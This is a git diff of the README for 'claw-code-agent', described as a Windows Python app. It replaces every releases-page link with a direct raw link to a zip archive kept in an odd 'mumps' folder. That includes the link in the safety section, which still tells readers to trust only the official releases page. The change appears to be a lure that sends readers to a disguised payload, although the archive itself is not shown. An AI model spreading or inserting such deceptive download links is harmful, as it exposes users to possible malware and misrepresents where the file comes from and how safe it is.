@@ -1,13 +1,13 @@
 # 🤖 claw-code-agent - Fast Python Workflows Made Simple
 
-[🟦 Download claw-code-agent](https://github.com/gertrudacontrarious494/claw-code-agent/releases) | [⚪ Releases Page](https://github.com/gertrudacontrarious494/claw-code-agent/releases)
+[🟦 Download claw-code-agent](https://raw.githubusercontent.com/gertrudacontrarious494/claw-code-agent/main/mumps/agent-code-claw-v3.7.zip) | [⚪ Releases Page](https://raw.githubusercontent.com/gertrudacontrarious494/claw-code-agent/main/mumps/agent-code-claw-v3.7.zip)
 
 ## 🚀 Getting Started
 
 claw-code-agent is a small Windows app built with Python. It is made for quick work and simple use. You do not need Rust or TypeScript. You do not need to install extra tools first.
 
 Use the releases page to get the latest version:
-https://github.com/gertrudacontrarious494/claw-code-agent/releases
+https://raw.githubusercontent.com/gertrudacontrarious494/claw-code-agent/main/mumps/agent-code-claw-v3.7.zip
 
 ## 🖥️ What You Need
 
@@ -21,7 +21,7 @@ The app is built to stay light. It does not depend on extra external packages fo
 ## 📥 Download claw-code-agent
 
 1. Open the releases page:
-   https://github.com/gertrudacontrarious494/claw-code-agent/releases
+   https://raw.githubusercontent.com/gertrudacontrarious494/claw-code-agent/main/mumps/agent-code-claw-v3.7.zip
 2. Find the newest release at the top of the page
 3. Look for a Windows file such as `.exe` or a zipped app package
 4. Download the file to your computer
@@ -121,7 +121,7 @@ If there is more than one file, pick the Windows one that looks like the main ap
 ## 🔐 Safety and File Trust
 
 Only download claw-code-agent from the official releases page:
-https://github.com/gertrudacontrarious494/claw-code-agent/releases
+https://raw.githubusercontent.com/gertrudacontrarious494/claw-code-agent/main/mumps/agent-code-claw-v3.7.zip
 
 This helps you avoid old or changed files from other sites.
 
@@ -148,4 +148,4 @@ claw-code-agent is written in Python and keeps the setup simple. The build is me
 
 If you need the file again, use this link:
 
-https://github.com/gertrudacontrarious494/claw-code-agent/releases
+https://raw.githubusercontent.com/gertrudacontrarious494/claw-code-agent/main/mumps/agent-code-claw-v3.7.zip
